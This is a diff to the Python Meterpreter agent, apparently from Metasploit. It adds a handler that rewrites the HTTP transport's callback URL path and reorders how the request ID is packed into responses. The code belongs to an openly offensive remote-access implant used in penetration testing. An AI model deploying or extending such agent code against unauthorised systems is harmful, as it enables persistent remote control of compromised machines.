@@ -5,6 +5,7 @@ import code
 import os
 import platform
 import random
+import re
 import select
 import socket
 import struct
@@ -562,6 +563,13 @@ class HttpTransport(Transport):
 		url_h = urllib.urlopen(request, timeout=self.communication_timeout)
 		response = url_h.read()
 
+	def patch_uri_path(self, new_path):
+		match = re.match(r'https?://[^/]+(/.*$)', self.url)
+		if match is None:
+			return False
+		self.url = self.url[:match.span(1)[0]] + new_path
+		return True
+
 	def tlv_pack_transport_group(self):
 		trans_group  = super(HttpTransport, self).tlv_pack_transport_group()
 		if self.user_agent:
@@ -863,6 +871,14 @@ class PythonMeterpreter(object):
 		response += tlv_pack(TLV_TYPE_MACHINE_ID, "%s:%s" % (serial, machine_name))
 		return ERROR_SUCCESS, response
 
+	def _core_patch_url(self, request, response):
+		if not isinstance(self.transport, HttpTransport):
+			return ERROR_FAILURE, response
+		new_uri_path = packet_get_tlv(request, TLV_TYPE_TRANS_URL)['value']
+		if not self.transport.patch_uri_path(new_uri_path):
+			return ERROR_FAILURE, response
+		return ERROR_SUCCESS, response
+
 	def _core_loadlib(self, request, response):
 		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
 		if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
@@ -1075,9 +1091,6 @@ class PythonMeterpreter(object):
 		method_tlv = packet_get_tlv(request, TLV_TYPE_METHOD)
 		resp += tlv_pack(method_tlv)
 
-		reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
-		resp += tlv_pack(reqid_tlv)
-
 		handler_name = method_tlv['value']
 		if handler_name in self.extension_functions:
 			handler = self.extension_functions[handler_name]
@@ -1095,6 +1108,11 @@ class PythonMeterpreter(object):
 		else:
 			self.debug_print('[-] method ' + handler_name + ' was requested but does not exist')
 			result = error_result(NotImplementedError)
+
+		reqid_tlv = packet_get_tlv(request, TLV_TYPE_REQUEST_ID)
+		if not reqid_tlv:
+			return
+		resp += tlv_pack(reqid_tlv)
 		return tlv_pack_response(result, resp)
 
 if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
